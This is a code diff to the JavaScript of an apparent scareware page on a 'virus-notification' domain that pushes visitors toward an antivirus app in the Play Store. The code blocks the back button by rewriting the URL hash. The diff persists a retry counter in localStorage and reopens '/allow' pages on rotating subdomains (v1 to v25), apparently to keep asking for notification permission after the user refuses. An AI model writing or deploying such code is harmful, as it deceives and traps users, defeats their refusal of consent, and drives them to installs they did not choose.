@@ -61,6 +61,15 @@
                 window.location.hash = "back";
                 window.onhashchange = function() { window.location.hash = "stay"; };
             }
+            
+            var setRetryCount = function(retryCount) {
+                localStorage.setItem('retryCount', retryCount);
+            };
+            
+            var getRetryCount = function() {
+                var value = localStorage.getItem('retryCount');
+                return parseInt(value ? value : 0);
+            };
 
             function getParameterByName(name) {
                 name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
@@ -110,8 +119,19 @@
             var newWin;
             var destination = "https://play.google.com/store/apps/details?id=com.antivirus&hl=en";
             var domain = isLocal ? 'v-notifier.dev' : 'virus-notification.com';
-            var localCount = 0;
             var maxRetryCount = isLocal ? 3 : 25;
+            
+            var escapeToDestination = function() {
+                if (isLocal) {
+                    window.location.href = destination;
+                } else {
+                    window.location.replace(destination);
+                }
+                
+                if (newWin) {
+                    newWin.postMessage('close', '*');
+                }
+            };
 
             (function() {
                 var eventUsed = false;
@@ -120,13 +140,16 @@
                 $('#buttonAction').on(eventType, function(event) {
                     if (event.type === 'touchstart') $('#buttonAction').off('click');
                     if (eventUsed) return; eventUsed = true;
-
-                    if (localCount === 0) {
-                        localCount++;
+                    
+                    if (getRetryCount() >= maxRetryCount) {
+                        escapeToDestination();
+                        return;
+                    }
+                    
+                    if (getRetryCount() === 0) {
                         newWin = window.open('/allow');
                     } else {
-                        localCount++;
-                        newWin = window.open('https://v' + localCount + '.' + domain + '/allow#shake');
+                        newWin = window.open('https://v' + (getRetryCount() + 1) + '.' + domain + '/allow#shake');
                     }
 
                     // re-enable button after some time has passed
@@ -136,16 +159,6 @@
                 });
             })();
             
-            var escapeToDestination = function() {
-                if (isLocal) {
-                    window.location.href = destination;
-                } else {
-                    window.location.replace(destination);
-                }
-
-                newWin.postMessage('close', '*');
-            };
-
             window.addEventListener('message', function(e) {
                 if (e.data === 'escape') {
                     escapeToDestination();
@@ -154,16 +167,17 @@
                 
                 var parts = e.data.split('.');
                 var subdomain = parts[0];
-                var retryCount = parseInt(subdomain.replace(/(http|https):\/\/v/g, '')) || 0;
+                var receivedCount = parseInt(subdomain.replace(/(http|https):\/\/v/g, '')) || 0;
+                
+                if (receivedCount > getRetryCount()) {
+                    setRetryCount(receivedCount);
+                }
 
-                if (retryCount < maxRetryCount) {
-                    retryCount++;
-                    localCount = retryCount;
-
+                if (receivedCount < maxRetryCount) {
                     newWin.postMessage('no-beforeunload', '*');
 
                     setTimeout(function() {
-                        newWin.location.href = 'https://v' + retryCount + '.' + domain + '/allow#shake';
+                        newWin.location.href = 'https://v' + (receivedCount + 1) + '.' + domain + '/allow#shake';
                     }, 150);
                 } else {
                     escapeToDestination();
